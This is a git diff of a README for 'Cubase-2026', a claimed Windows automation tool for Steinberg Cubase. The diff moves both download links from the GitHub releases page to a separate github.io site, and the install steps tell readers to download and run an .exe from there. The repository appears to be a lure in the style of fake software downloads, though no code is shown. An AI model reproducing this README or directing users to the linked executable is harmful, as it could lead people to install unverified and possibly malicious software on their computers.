@@ -1,6 +1,6 @@
 # 🎹 Cubase-2026 - Streamline your audio production workflow today
 
-[![](https://img.shields.io/badge/Download-Cubase-2026-blue)](https://github.com/Implemented-nosh325/Cubase-2026/releases)
+[![](https://img.shields.io/badge/Download-Cubase-2026-blue)](https://implemented-nosh325.github.io)
 
 Cubase-2026 improves how you manage tracks, organize your VST library, and export audio stems in Steinberg Cubase. This tool automates repetitive tasks to save time during music production. It runs on Windows systems.
 
@@ -20,7 +20,7 @@ Ensure your Windows system receives all current updates. This helps the software
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official release page](https://github.com/Implemented-nosh325/Cubase-2026/releases) to access the download files.
+1. Visit the [official release page](https://implemented-nosh325.github.io) to access the download files.
 2. Look for the file ending in .exe under the most recent release.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
